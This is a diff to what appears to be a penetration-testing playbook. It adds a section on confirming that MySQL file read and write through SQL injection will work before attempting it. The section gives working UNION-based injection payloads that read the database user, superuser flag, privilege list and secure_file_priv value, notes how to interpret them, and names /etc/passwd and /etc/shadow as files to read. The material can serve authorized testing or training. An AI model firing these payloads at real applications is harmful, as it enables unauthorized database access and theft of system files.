@@ -1215,3 +1215,41 @@ authenticated scoping queries. After confirming the injection, register one such
 log in: the claim-carried payload is a second-order path worth one confirmation probe.
 
 <!-- promoted-slug: pre-auth-write-sqli-surface -->
+
+## Proving the MySQL file-read/write lane before attempting it
+
+The File Read / Write section above says "Requires FILE privilege + permissive secure_file_priv";
+check BOTH through the injection itself before burning requests on `LOAD_FILE`/`INTO OUTFILE`
+probes that silently return NULL.
+
+```sql
+-- current DB user (root is usually DBA -> FILE likely)
+' UNION SELECT 1,user(),3,4-- -
+
+-- superuser? (Y = yes)
+' UNION SELECT 1,super_priv,3,4 FROM mysql.user WHERE user='root'-- -
+
+-- full privilege list for the current user; look for FILE
+' UNION SELECT 1,grantee,privilege_type,4 FROM information_schema.user_privileges
+  WHERE grantee="'root'@'localhost'"-- -
+```
+
+`secure_file_priv` cannot be read with `SHOW VARIABLES` inside a UNION (it is not a SELECT);
+it lives in `information_schema.global_variables` (MySQL 8: also `performance_schema.global_variables`):
+
+```sql
+' UNION SELECT 1,variable_name,variable_value,4 FROM information_schema.global_variables
+  WHERE variable_name='secure_file_priv'-- -
+```
+
+Semantics decide the lane:
+- empty value -> read/write anywhere the OS user can (MariaDB default)
+- a directory -> only inside it (MySQL default: `/var/lib/mysql-files`)
+- `NULL` -> file read/write impossible; drop the lane, do not probe
+
+While enumerating `information_schema.schemata`, skip the default databases `mysql`,
+`information_schema`, `performance_schema`, `sys`; anything else is app data worth listing.
+The OS user running mysqld must also be able to read the target file (`/etc/passwd` yes,
+`/etc/shadow` usually no).
+
+<!-- promoted-slug: mysql-file-ops-preconditions -->
